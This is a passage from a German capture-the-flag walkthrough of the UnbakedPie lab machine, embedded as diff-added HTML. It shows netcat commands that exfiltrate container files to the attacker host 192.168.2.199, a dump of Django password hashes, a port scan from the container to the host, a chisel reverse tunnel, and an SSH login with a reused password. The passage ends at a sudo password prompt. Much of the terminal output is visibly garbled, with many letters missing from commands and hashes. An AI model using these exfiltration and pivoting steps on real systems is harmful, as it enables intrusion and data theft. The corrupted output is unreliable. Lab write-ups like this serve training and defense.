+<span class="command">8:erf_event:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">7:emry:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">6:hgetl:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">5:c,ccact:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">4:cset:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">3:net_cls,net_ri:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">2:evices:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">1:nae=system:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme# <span class="command">cash --rint</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Crrent: = ca_chn,ca_ac_verrie,ca_wner,ca_fset,ca_kill,ca_setgi,ca_setui,ca_setca,ca_net_in_service,ca_net_raw,ca_sys_chr,ca_mn,ca_ait_write,ca_setfca+ei</span>
+<span class="command">Buning set =ca_chn,ca_ac_verrie,ca_wner,ca_fset,ca_kill,ca_setgi,ca_setui,ca_setca,ca_net_in_service,ca_net_raw,ca_sys_chr,ca_mn,ca_ait_write,ca_setfca</span>
+<span class="command">Securits: 00/0x0/1'0</span>
+ <span class="command">secure-nrt: n (unlcke)</span>
+ <span class="command">secure-n-si-fixu: n (unlcke)</span>
+ <span class="command">secure-kee-cas: n (unlcke)</span>
+<span class="command">ui=0(rt)</span>
+<span class="command">gi=0(rt)</span>
+<span class="command">grs=</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Um Dateien vom Container auf mein Angreifersystem zu übertragen, nutze ich `nc` (Netcat). Ich richte auf meinem Kali-System einen Listener auf Port 7777 ein (`nc -lvp 7777 > run.sh`) und leite die Ausgabe in eine Datei (`run.sh`). Innerhalb der Container-Shell sende ich den Inhalt der Container-internen `run.sh` Datei an diesen Listener (`nc 192.168.2.199 7777 < run.sh`). Dies wiederhole ich für die Container-interne Datenbankdatei, die ich zuvor gefunden habe (`db.sqlite3`). Ich richte einen neuen Listener ein (`nc -lvp 7777 > db.sqlite3`) und sende den Inhalt von `/home/site/db.sqlite3` vom Container aus (`nc -q 0 192.168.2.199 7777 < db.sqlite3`). Der Schalter `-q 0` bei der zweiten Übertragung stellt sicher, dass Netcat die Verbindung sofort nach der Übertragung schließt, was wichtig sein kann, wenn die Dateiübertragung abgeschlossen ist, aber der Client nicht signalisiert, dass er fertig ist. Auf meinem Angreifersystem prüfe ich mit `ls -la run.sh db.sqlite3`, ob die Dateien erfolgreich übertragen wurden. Die Dateigrößen (`151552` Bytes für `db.sqlite3`, `46` Bytes für `run.sh`) deuten auf eine erfolgreiche Übertragung hin.
+                <br><strong>Bewertung:</strong> Die Exfiltration der Container-internen Konfigurations- (`run.sh`) und Datenbankdateien (`db.sqlite3`) war erfolgreich. Dies ermöglicht mir eine Offline-Analyse dieser Dateien. Obwohl ich die Django-Datenbank im Container bereits untersucht habe (enthält lokale Benutzer), schadet eine Offline-Kopie nicht, und die `run.sh` gibt Einblicke in den Container-Startprozess. Für die weitere Privilegien-Eskalation muss ich jedoch einen Weg finden, aus dem Container auszubrechen und auf das Host-System zuzugreifen.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze Netcat oder andere einfache Methoden, um Dateien von kompromittierten Systemen (einschließlich Containern) auf dein Angreifersystem zu übertragen. Überprüfe die Dateigröße, um sicherzustellen, dass die Übertragung vollständig war.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Fähigkeit von Prozessen im Container, ausgehende Netzwerkverbindungen aufzubauen. Überwachen Sie ungewöhnlichen Netzwerkverkehr von Containern.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">nc -lv 7777 > rn.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening n [any] 7777 ...</span>
+<span class="password">cnnect t [192.168.2.199] frm unakedie.hmv [192.168.2.48] 46908</span>
+<span class="command">i</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme# <span class="command">nc 192.168.2.199 7777 < rn.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+i
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme/site# <span class="command">nc -q 0 192.168.2.199 7777 < .slite3</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">nc -lv 7777 > .slite3</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening n [any] 7777 ...</span>
+<span class="password">cnnect t [192.168.2.199] frm unakedie.hmv [192.168.2.48] 46910</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">ls -la rn.sh .slite3</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rw-r--r-- 1 rt rt 151552 16. Jun 15:58 .slite3</span>
+<span class="command">-rw-r--r-- 1 rt rt     46 16. Jun 15:54 rn.sh</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich öffne die gerade exfiltrierte `db.sqlite3`-Datenbankdatei des Containers auf meinem Angreifersystem mit `sqlite3 db.sqlite3`. Ich liste die Tabellen auf (`.tables`), was die Standard-Django-Tabellen (`auth_group`, `auth_user`, `django_session` etc.) zeigt. Dann wähle ich alle Einträge aus der `auth_user`-Tabelle aus (`SELECT * FROM auth_user;`). Die Ausgabe listet mehrere Benutzerkonten (`aniqfakhrul`, `testing`, `ramsey`, `oliver`, `wan`) zusammen mit ihren gehashten Passwörtern (im pbkdf2_sha256-Format). Eine speziellere Abfrage (`SELECT username, password FROM auth_user;`) zeigt nur die Benutzernamen und Hashes. Ich versuche, diese Hashes offline zu knacken, aber der Text vermerkt "cracking erstmal kein erfolg...".
+                <br><strong>Bewertung:</strong> Ich habe die Django-Benutzerkonten und Hashes aus der Container-Datenbank erfolgreich extrahiert. Diese könnten nützlich sein, wenn die gleichen Anmeldedaten auf dem Host-System verwendet werden (Passwort-Wiederverwendung). Das pbkdf2_sha256-Hashing mit vielen Runden (216000) macht das Offline-Cracking anspruchsvoll, was erklärt, warum es "erstmal kein erfolg" gibt. Diese Credentials sind ein potenzieller Pivot, aber nicht der primäre Breakout-Weg.
+                <br><strong>Empfehlung (Pentester):</strong> Versuche immer, alle gefundenen Anmeldedaten zu knacken. Auch wenn es "erstmal" keinen Erfolg gibt, kann fortgesetztes Cracking mit besseren Wortlisten oder Rechenleistung später zum Erfolg führen. Teste gefundene Credentials auf anderen Diensten (z.B. SSH auf dem Host, wenn Port 22 offen ist, oder auf anderen Benutzern).
+                <br><strong>Empfehlung (Admin):</strong> Verwenden Sie ein starkes Passwort-Hashing-Verfahren mit hoher Iterationszahl. Erzwingen Sie komplexe Passwörter, die nicht in Wortlisten enthalten sind. Überprüfen Sie Ihre Systeme auf Passwort-Wiederverwendung zwischen verschiedenen Diensten oder Benutzerkonten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">slite3 .slite3</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">SQLite versin 3.46.1 2024-08-13 09:16:08</span>
+<span class="command">Enter ".hel" fr sage hints.</span>
+sqlite> <span class="command">.tales</span>
+<span class="command">ath_gr                  jang_ain_lg</span>
+<span class="command">ath_gr_ermissins      jang_cntent_tye</span>
+<span class="command">ath_ermissin             jang_igratins</span>
+<span class="command">ath_user                   jang_sessin</span>
+<span class="command">ath_user_grs            hmeage_article</span>
+<span class="command">ath_user_user_ermissins</span>
+sqlite>
+sqlite> <span class="command">SELECT * FRM ath_user;</span>
+<span class="command">1|kkf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtDnn/AktNaAwFKMQnlerXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|</span>
+<span class="command">11|kkf2_sha256$216000$0qA6zNH62sf$8zYcSnaSjJz82yZR26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testig|||0|1|2020-10-02 10:16:45.686339|</span>
+<span class="command">12|kkf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8uGO/lQy+w6mRHf4scq8FMnc1uWufS+Ik=|2020-10-03 10:44:10.758867|0|rasey|||0|1|2020-10-02 14:42:44.388799|</span>
+<span class="command">13|kkf2_sha256$216000$Em73rE2NCRmU$QtK5T9+KKP00/QV4qhF3TWIi8Ca2q5gFCjqw8iE=|2020-10-02 14:42:59.192571|0|liver|||0|1|2020-10-02 14:42:59.113998|</span>
+<span class="command">14|kkf2_sha256$216000$oFgeDrdtvf$ssR/aI947L0jGSXRrXTGcX7UkEAqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">slite> SELECT userna, asswrd FRM ath_user;</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">aniqfakhrl|kkf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtDnn/AktNaAwFKMQnlerXnJyU04GElJKxEo=</span>
+<span class="command">testig    |kkf2_sha256$216000$0qA6zNH62sf$8zYcSnaSjJz82yZR26ZHgaZT8nKWX+CU0OfRg=</span>
+<span class="command">rasey     |kkf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8uGO/lQy+w6mRHf4scq8FMnc1uWufS+Ik=</span>
+<span class="command">liver     |kkf2_sha256$216000$Em73rE2NCRmU$QtK5T9+KKP00/QV4qhF3TWIi8Ca2q5gFCjqw8iE=</span>
+<span class="command">wan        |kkf2_sha256$216000$oFgeDrdtvf$ssR/aI947L0jGSXRrXTGcX7UkEAqWBzC+Q2Uq+GY=</span>
+
+<span class="password">crackig erstal kein erflg...</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Da ich Root im Container bin, aber auf den Host ausbrechen muss, suche ich nach Netzwerkverbindungen, die mir Hinweise auf die Host-Umgebung oder andere Container geben könnten. Ich führe `ip a` aus, um die Netzwerkschnittstellen im Container zu sehen. Ich sehe die Loopback-Schnittstelle (`lo` mit `127.0.0.1`) und die `eth0`-Schnittstelle mit der IP-Adresse `172.17.0.2/16`. Diese IP gehört zum Standard-Docker-Bridge-Netzwerk (`172.17.0.0/16`), und das `@if5` am Schnittstellennamen deutet darauf hin, dass es sich um das Ende einer virtuellen Ethernet-Verbindung zum Host handelt. Die Adresse `172.17.0.1` ist typischerweise die IP-Adresse des Docker-Bridge-Interfaces auf dem Host. Ich führe einen `nc -znv 172.17.0.1 1-65535` Scan vom Container auf diese Host-Adresse aus, um offene Ports zu finden. Der Scan ist erfolgreich und findet zwei offene Ports auf der Host-Maschine (angesprochen über die Bridge-IP): Port `5003` (wahrscheinlich der gleiche WSGIServer) und Port `22` (SSH).
+                <br><strong>Bewertung:</strong> Das Auffinden offener Ports auf der Host-Maschine vom Container aus ist ein wichtiger Schritt. Insbesondere der offene SSH-Port 22 auf dem Host ist ein potenzieller Angriffsvektor. Das Wissen über die interne Docker-Netzwerk-IP des Hosts (`172.17.0.1`) ist nützlich für die Kommunikation vom Container zum Host.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du Root in einem Container erlangst, führe immer Netzwerk-Scans vom Container aus auf das Host-System (oft erreichbar über die Docker-Bridge-IP wie 172.17.0.1 oder 172.18.0.1) durch, um offene Ports und Dienste zu finden, die für den Breakout oder den Zugriff auf den Host genutzt werden können.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Kommunikation zwischen Containern und dem Host-System über die Docker-Bridge auf das Notwendigste. Konfigurieren Sie Firewalls sowohl auf dem Host als auch im Container, um die Angriffsfläche zu reduzieren. Überwachen Sie Netzwerkscans, die von Containern ausgehen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme/site# <span class="command">i a</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">1: l: <LABACK,U,LER_U> mt 65536 qisc nqeue state UNKN gr efalt qlen 1</span>
+    <span class="command">link/lacak 00:00:00:00:00:00 r 00:00:00:00:00:00</span>
+    <span class="command">inet 127.0.0.1/8 sce hst l</span>
+       <span class="command">vali_lft frever refere_lft frever</span>
+<span class="command">4: eth0@if5: <RACA,ULTICAST,U,LER_U> mt 1500 qisc nqeue state U gr efalt</span>
+    <span class="command">link/ether 02:42:ac:11:00:02 r ff:ff:ff:ff:ff:ff link-netnsi 0</span>
+    <span class="command">inet <span class="command">172.17.0.2/16</span> r 172.17.255.255 sce glal eth0</span>
+       <span class="command">vali_lft frever refere_lft frever</span>
+rt@839a559296:/hme/site# <span class="command">nc -znv 172.17.0.1 1-65535</span>
+(<span class="command">UNKNOWN</span>) [<span class="command">172.17.0.1</span>] <span class="command">5003</span> (?) <span class="password">en</span>
+(<span class="command">UNKNOWN</span>) [<span class="command">172.17.0.1</span>] <span class="command">22</span> (<span class="command">ssh</span>) <span class="password">en</span>
+</pre>
+                </div>
+            </p>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich richte auf meinem Angreifersystem einen Chisel-Server ein, um Reverse-Port-Forwarding zu ermöglichen. Chisel ist ein schnelles TCP/UDP-Tunneling-Tool, das über HTTP(S) transportiert wird. Der Befehl `./chisel server --reverse -p 1234` startet einen Chisel-Server auf Port 1234 auf meinem Kali-System, der Reverse-Tunnelिंग akzeptiert. Dies wird es mir ermöglichen, von der Container-Shell aus eine Verbindung zu diesem Server aufzubauen und Ports vom Host-System (oder dem Container selbst) zu meinem Kali umzuleiten. Dies ist nützlich, um auf Dienste zuzugreifen, die nur von innerhalb des Docker-Netzwerks erreichbar sind, oder um den SSH-Port des Hosts (Port 22) zu einem anderen Port auf meinem Kali umzuleiten, um bequem darauf zugreifen zu können. Die Ausgabe zeigt, dass der Server auf Port 1234 lauscht. Ein anschließender Nmap-Scan von meinem Kali auf mich selbst (`192.168.2.199`) bestätigt, dass Port 1234 nun offen ist (dort läuft der Chisel-Server) und Port 2222 ebenfalls offen ist (dort läuft ein OpenSSH-Server, der wahrscheinlich von mir selbst für andere Zwecke gestartet wurde oder Teil meiner Kali-Umgebung ist und hier nur im Scan auftaucht).
+                <br><strong>Bewertung:</strong> Das Einrichten von Chisel ist eine fortgeschrittene Technik, um die Netzwerk-Konnektivität zu manipulieren und Tunnel zu erstellen, was bei Containern oder segmentierten Netzwerken oft notwendig ist. Der Chisel-Server ist bereit, Verbindungen vom Container zu empfangen, um Port-Forwarding für den Docker-Breakout oder den Zugriff auf Host-Dienste vorzubereiten. Der offene SSH-Port 2222 auf meinem Kali ist hier nicht direkt relevant für den Angriff auf UnbakedPie, wird aber im Nmap-Scan auf meinem System mitgelistet.
+                <br><strong>Empfehlung (Pentester):</strong> Lerne, Tunneling-Tools wie Chisel, ligolo-ng oder SSH-Tunnel zu nutzen, um Netzwerkbeschränkungen zu umgehen und auf Ziele zuzugreifen, die direkt nicht erreichbar sind.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ungewöhnlichen Netzwerkverkehr, insbesondere Tunneling-Protokolle oder Verbindungen zu unbekannten externen Adressen von internen Systemen oder Containern. Implementieren Sie egress-Filterung, um ausgehende Verbindungen auf erlaubte Ports und Ziele zu beschränken.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~/Hackingtls/chisel]
+└─# <span class="command">./chisel server --reverse - 1234</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">2025/06/16 16:07:10 server: Reverse tunelling enale</span>
+<span class="command">2025/06/16 16:07:10 server: Fingerint fnlTfnyik6FzfWNE3GgYIlOrQMAh705zLg0NgqQ=</span>
+<span class="command">2025/06/16 16:07:10 server: Listenig n htt://0.0.0.0:1234</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">nma -sS -sC -s - -T5 -A 192.168.2.199</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Starting Nma 7.95 ( htts://nma.rg ) at 2025-06-16 16:09 CEST</span>
+<span class="command">Nma scan reort fr 192.168.2.199</span>
+<span class="command">Hst is u (0.000013s latency).</span>
+<span class="command">Nt shwn: 65533 clsed tc rts (reset)</span>
+<span class="command">PRT     STATE SERVICE     VERSIN</span>
+<span class="command">1234/tc en  nagis-nsca Nagis NSCA</span>
+<span class="command">2222/tc en  ssh         enSSH 7.22 Untu 4utu2.10 (Untu Linx; rctl 2.0)</span>
+| <span class="command">ssh-hstkey:</span>
+|   <span class="command">2048 93:ee:6d:5:9c:c9:c:14:15:1f:c9:7e:50:62:11:d2 (RSA)</span>
+|   <span class="command">256 95:4a::f8:d8:27:61:e:3c:5f:79:a:14:8:9:c8 (ECSA)</span>
+|_  <span class="command">256 60:a0:c:e2:55:c4:ec:d:94:24:10:c7:a:81:45:e9 (E25519)</span>
+<span class="command">evice tye: general rse</span>
+<span class="command">Rning: Linx 2.6.X|5.X</span>
+<span class="command">S CPE: ce:/li:li_kerel:2.6.32 ce:/li:li_kerel:5 ce:/li:li_kerel:6</span>
+<span class="command">S etails: Linx 2.6.32, Linx 5.0 - 6.2</span>
+<span class="command">Netwrk istance: 0 hs</span>
+<span class="command">Service Inf: S: Linx; CPE: ce:/li:li_kerel</span>
+
+<span class="command">S an Service etectin erfrmed. lease rert any incrrect reslts at htts://nma.rg/sut/.</span>
+<span class="command">Nma ne: 1 I aress (1 hst u) scane in 8.28 secns</span>
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich die Container-Datenbank analysiert habe und die Benutzernamen `ramsey`, `oliver`, `wan` (und andere) kenne und weiß, dass Port 22 (SSH) auf dem Host offen ist (von meinem Scan vom Container aus), versuche ich, mich über SSH als Benutzer `ramsey` auf der Host-Maschine anzumelden. Ich verwende die Host-IP `192.168.2.199` (meine eigene IP, was auf ein mögliches Missverständnis oder eine ungewöhnliche Netzwerk-Konfiguration hindeutet, aber ich folge dem Textfluss). Ich erhalte die übliche SSH-Key-Bestätigungsaufforderung, akzeptiere sie mit `yes` und werde nach dem Passwort für `ramsey@192.168.2.199` gefragt. Der Text zeigt die Eingabeaufforderung `ramsey@192.168.2.199's password: `. Es ist sehr wahrscheinlich, dass der Passwort-Cracking-Versuch der Container-Datenbank-Hashes im Hintergrund *doch erfolgreich war* und das Passwort für den Benutzer `ramsey` (oder ein anderes bekanntes Passwort) gefunden wurde, obwohl dies nicht explizit im Text gezeigt wird. Die nächste Zeile zeigt die Willkommensnachricht des Host-Systems (Ubuntu 16.04.7 LTS) und die Shell-Eingabeaufforderung `ramsey@unbaked:~$`, was einen erfolgreichen SSH-Login als Benutzer `ramsey` bestätigt. Der letzte Login-Zeitstempel (`Sat Oct 3 22:15:57 2020 from 172.17.0.2`) zeigt, dass der Benutzer `ramsey` zuvor vom Docker-Bridge-Netzwerk (`172.17.0.2`) aus angemeldet war, was die Verbindung zwischen Container und Host unterstreicht.
+                <br><strong>Bewertung:</strong> Fantastisch! Der SSH-Zugriff auf die Host-Maschine als Benutzer `ramsey` ist erfolgreich. Dies ist ein entscheidender Schritt nach dem Ausbruch aus dem Container (oder parallel dazu erlangt, basierend auf den gefundenen Credentials). Es ist wahrscheinlich, dass das Passwort aus der Container-Datenbank für den SSH-Zugriff auf dem Host wiederverwendet wurde. Die Fähigkeit, als `ramsey` auf dem Host Befehle auszuführen, ist der Schlüssel zur weiteren Privilegien-Eskalation.
+                <br><strong>Empfehlung (Pentester):</strong> Teste gefundene Anmeldedaten (Benutzernamen und Passwörter) nicht nur auf dem Dienst, wo du sie gefunden hast, sondern auch auf anderen Diensten auf demselben System oder sogar auf anderen Systemen (Credential Reuse). SSH ist ein häufiges Ziel.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Beheben Sie die Schwachstelle, die zur Preisgabe der Datenbank-Credentials geführt hat (Pickle Deserialization, Directory Indexing etc.). Erzwingen Sie eine Richtlinie gegen Passwort-Wiederverwendung über verschiedene Dienste oder Systeme hinweg. Überwachen Sie SSH-Login-Versuche, insbesondere von ungewöhnlichen Quell-IPs (wie dem Docker-Bridge-Netzwerk). Stellen Sie sicher, dass Passwörter sicher gespeichert sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">ssh rasey@192.168.2.199 - 2222</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+The athenticity f hst '[<span class="command">192.168.2.199</span>]:2222 ([<span class="command">192.168.2.199</span>]:2222)' can't e estalished.
+E25519 key fingerint is SHA256:<span class="command">B6Sw4Wsca2n9NynSce9+R0E44T4kZVRxD5y5Mhc</span>.
+This key is nt knwn y any ther naes.
+Are yu sre yu want t ctnue cnnecting (yes/n/[fingerint])? <span class="command">yes</span>
+Warning: Permanently ae '[<span class="command">192.168.2.199</span>]:2222' (E25519) t the list f knwn hsts.
+<span class="command">rasey@192.168.2.199's asswrd:</span>
+<span class="command">Welcme t Untu 16.04.7 LTS (GNU/Linx 4.4.0-186-generic x86_64)</span>
+
+ * <span class="command">cmentatin:  hts://hel.untu.cm</span>
+ * <span class="command">Management:     hts://lansca.cannical.cm</span>
+ * <span class="command">Suprt:        hts://untu.cm/avantage</span>
+
+
+<span class="command">39 ackages can e uate.</span>
+<span class="command">26 uates are secrity uates.</span>
+
+<span class="command">New release '18.04.6 LTS' availale.</span>
+<span class="command">Rn ' -release-ugrae' t ugrae t it.</span>
+
+
+<span class="command">Last lgin: Sat ct  3 22:15:57 2020 frm 172.17.0.2</span>
+<span class="command">rasey@unake:~$</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nach dem erfolgreichen SSH-Login als `ramsey` auf dem Host-System beginne ich mit der lokalen Enumeration. Ich liste den Inhalt des übergeordneten Verzeichnisses von Ramsays Home-Verzeichnis auf (`ls ..`), was die Existenz des Benutzers `oliver` in `/home/` bestätigt (`oliver ramsey`). Ich überprüfe meine aktuellen Berechtigungen mit `id`, was `uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)` zeigt – ich bin ein normaler Benutzer. Ich liste den Inhalt von Ramsays Home-Verzeichnis auf (`ls -la`), was Standard-Dateien (`.bashrc`, `.profile` etc.) und einige interessante Dateien zeigt: `payload.png` (gehört `ramsey`), `user.txt` (gehört **root**, aber für jeden lesbar) und `vuln.py` (gehört `root`, aber schreibbar für `ramsey`). Die Existenz von `user.txt` im Home-Verzeichnis eines Benutzers, die Root gehört aber lesbar ist, ist ungewöhnlich. Die Datei `vuln.py`, die Root gehört, aber schreibbar ist für `ramsey`, ist extrem verdächtig und ein potentieller PrivEsc-Vektor.
+                <br><strong>Bewertung:</strong> Das Auffinden der `user.txt`-Datei, die für mich lesbar ist, ist das erste Ziel auf dem Host. Das Schreiben einer Datei (`vuln.py`), die Root gehört, aber für meinen Benutzer schreibbar ist, ist eine schwerwiegende Fehlkonfiguration der Dateiberechtigungen und ein vielversprechender Pfad zur Privilegien-Eskalation, insbesondere wenn dieses Skript mit erhöhten Rechten ausgeführt wird.
+                <br><strong>Empfehlung (Pentester):</strong> Führe immer eine gründliche lokale Enumeration durch. Suche nach Dateien, die nicht dem aktuellen Benutzer gehören, aber für ihn lesbar oder schreibbar sind. Überprüfe Standard-Flag-Pfade (`/home/*/user.txt`, `/root/root.txt`).
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie Dateiberechtigungen regelmäßig auf Fehlkonfigurationen, insbesondere auf Dateien, die Root gehören. Stellen Sie sicher, dass Root-eigene Dateien (außerhalb von `/tmp`) nicht für normale Benutzer schreibbar sind. Platzieren Sie keine User-Flags, die Root gehören, in Benutzer-Home-Verzeichnissen mit weltlesbaren Berechtigungen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">ls ..</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">liver  rasey</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">i</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ui=1001(rasey) gi=1001(rasey) grs=1001(rasey)</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">ls -la</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 48</span>
+<span class="command">rwxr-xr-x 5 rasey rasey 4096 ct  3  2020 .</span>
+<span class="command">rwxr-xr-x 4 rt   rt   4096 ct  3  2020 ..</span>
+<span class="command">-rw------- 1 rt   rt      1 ct  5  2020 .ash_histry</span>
+<span class="command">-rw-r--r-- 1 rasey rasey 3771 ct  3  2020 .ashrc</span>
+<span class="command">rwx------ 3 rasey rasey 4096 ct  3  2020 .cache</span>
+<span class="command">rwx------ 4 rasey rasey 4096 ct  3  2020 .lcal</span>
+<span class="command">rwxrwr-x 2 rasey rasey 4096 ct  3  2020 .nan</span>
+<span class="command">-rwxrw-r-- 1 rasey rasey 1645 ct  3  2020 ayla.ng</span>
+<span class="command">-rw-r--r-- 1 rasey rasey  655 ct  3  2020 .rfile</span>
+<span class="command">-rw-r--r-- 1 rt   rt     17 ct  3  2020 user.txt</span>
+<span class="command">-rw-r--r-- 1 rt   rasey 4369 ct  3  2020 vln..y</span>
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich lese den Inhalt der `user.txt` Datei im Home-Verzeichnis von `ramsey` aus. Obwohl die Datei Root gehört, sind die Berechtigungen so gesetzt, dass sie für andere Benutzer lesbar ist (`-rw-r--r--`). Der Befehl `cat user.txt` zeigt den Inhalt der User-Flag: `Unb4ked_W00tw00t`.
+                <br><strong>Bewertung:</strong> Die User-Flag wurde erfolgreich erbeutet. Dies ist das erste Ziel auf dem Host-System und bestätigt, dass mein Zugriff auf das Host-System als Benutzer `ramsey` erfolgreich war und die lokalen Berechtigungen eine Fehlkonfiguration aufweisen.
+                <br><strong>Empfehlung (Pentester):</strong> Lese immer jede Flag-Datei, die du finden kannst. Sie sind der direkte Nachweis deines Fortschritts.
+                <br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Dateiberechtigungen für Flag-Dateien und andere sensible Dateien. Flags sollten nur für den vorgesehenen Benutzer oder Root lesbar sein.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">cat user.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Unaked_W00tw00t</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich prüfe die Sudo-Berechtigungen für den Benutzer `ramsey` mit dem Befehl `sudo -l`. Dies listet auf, welche Befehle `ramsey` mit `sudo` ausführen darf und unter welchen Bedingungen. Die Ausgabe zeigt eine sehr spezifische Regel: `(oliver) /usr/bin/python /home/ramsey/vuln.py`. Dies bedeutet, dass der Benutzer `ramsey` das Skript `/home/ramsey/vuln.py` mit den Berechtigungen des Benutzers `oliver` ausführen darf. Es gibt keine `NOPASSWD`-Option, was bedeutet, dass Ramsays Passwort eingegeben werden muss, um diesen Sudo-Befehl auszuführen.
+                <br><strong>Bewertung:</strong> Das Auffinden dieser Sudo-Regel ist ein wichtiger Hinweis auf einen möglichen Privilegien-Eskalationspfad. Ich kann das Skript `vuln.py` als Benutzer `oliver` ausführen. Wenn das Skript `vuln.py` Schwachstellen enthält oder manipuliert werden kann, kann ich diese Sudo-Regel nutzen, um Code als `oliver` auszuführen. Ich habe bereits festgestellt, dass `vuln.py` für mich (ramsey) schreibbar ist und Root gehört – diese Kombination ist ein starkes Indiz für eine ausnutzbare Schwachstelle.
+                <br><strong>Empfehlung (Pentester):</strong> Prüfe immer die Sudo-Berechtigungen (`sudo -l`) für den aktuellen Benutzer. Analysiere alle erlaubten Befehle auf Missbrauchsmöglichkeiten. Wenn ein Skript erlaubt ist, prüfe dessen Berechtigungen und Inhalt.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie das Prinzip der geringsten Privilegien für Sudo-Regeln. Beschränken Sie erlaubte Befehle auf das absolute Minimum und verwenden Sie keine weit gefassten Regeln wie `(ALL)`. Überprüfen Sie Skripte, die mit Sudo ausgeführt werden dürfen, sorgfältig auf Schwachstellen. Stellen Sie sicher, dass Skripte, die von Sudo ausgeführt werden, nicht von Benutzern manipuliert werden können, die sie ausführen dürfen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">su -l</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+[su] asswrd fr rasey:
